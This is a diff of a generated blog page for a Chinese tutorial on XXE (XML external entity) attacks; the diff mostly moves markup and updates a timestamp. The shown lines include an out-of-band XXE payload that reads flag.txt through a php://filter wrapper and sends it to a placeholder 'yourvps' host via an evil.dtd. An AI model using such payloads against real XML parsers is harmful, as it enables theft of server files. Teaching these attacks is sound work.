@@ -98,7 +98,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/07/29/XXE/Picture8.png">
 <meta property="og:image" content="http://yoursite.com/2019/07/29/XXE/Picture9.png">
 <meta property="og:image" content="http://yoursite.com/2019/07/29/XXE/Picture10.png">
-<meta property="og:updated_time" content="2019-07-29T08:40:24.239Z">
+<meta property="og:updated_time" content="2019-07-29T08:43:56.413Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XXE原理及实现">
 <meta name="twitter:description" content="XXE原理及实现">
@@ -409,21 +409,15 @@
 <p>evil.dtd:</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://yourvps/%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure>
 <p>yourvps:<br><strong>cat /var/log/httpd/access_log</strong></p>
-<p><img src="/2019/07/29/XXE/Picture5.png" alt></p>
-<p><strong>payload2</strong><br>当遇到文件内容中有特殊的字符不能被解析时（如下）</p>
+<h2 id><a href="#" class="headerlink" title></a><img src="/2019/07/29/XXE/Picture5.png" alt></h2><p><strong>payload2</strong><br>当遇到文件内容中有特殊的字符不能被解析时（如下）</p>
 <p><img src="/2019/07/29/XXE/Picture11.png" alt></p>
 <p>当前的flag.txt文件内容为flag{this_is_flag}<br>则可以使用php伪协议进行读取</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=flag.txt"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://yourvps/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">%dtd; %all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p><img src="/2019/07/29/XXE/Picture6.png" alt></p>
 <p><img src="/2019/07/29/XXE/Picture7.png" alt></p>
+<p> <strong>调用过程</strong></p>
+<p> 解析时%dtd引入xxe.xml，之后%all引入send的定义，最后引用了实体send，把%file文件内容通过一个http请求发了出去</p>
 </li>
-</ol>
-<ul>
-<li><p>调用过程</p>
-<p>  解析时%dtd引入xxe.xml，之后%all引入send的定义，最后引用了实体send，把%file文件内容通过一个http请求发了出去</p>
-</li>
-</ul>
-<ol>
 <li><p>命令执行</p>
 <p> php环境下，xml命令执行要求php装有expect扩展</p>
 </li>
@@ -604,7 +598,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XML基础知识"><span class="nav-number">1.</span> <span class="nav-text">XML基础知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DTD"><span class="nav-number">2.</span> <span class="nav-text">DTD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE攻击"><span class="nav-number">3.</span> <span class="nav-text">XXE攻击</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XML基础知识"><span class="nav-number">1.</span> <span class="nav-text">XML基础知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DTD"><span class="nav-number">2.</span> <span class="nav-text">DTD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE攻击"><span class="nav-number">3.</span> <span class="nav-text">XXE攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">4.</span> <span class="nav-text"></span></a></li></ol></div>
             
 
           </div>
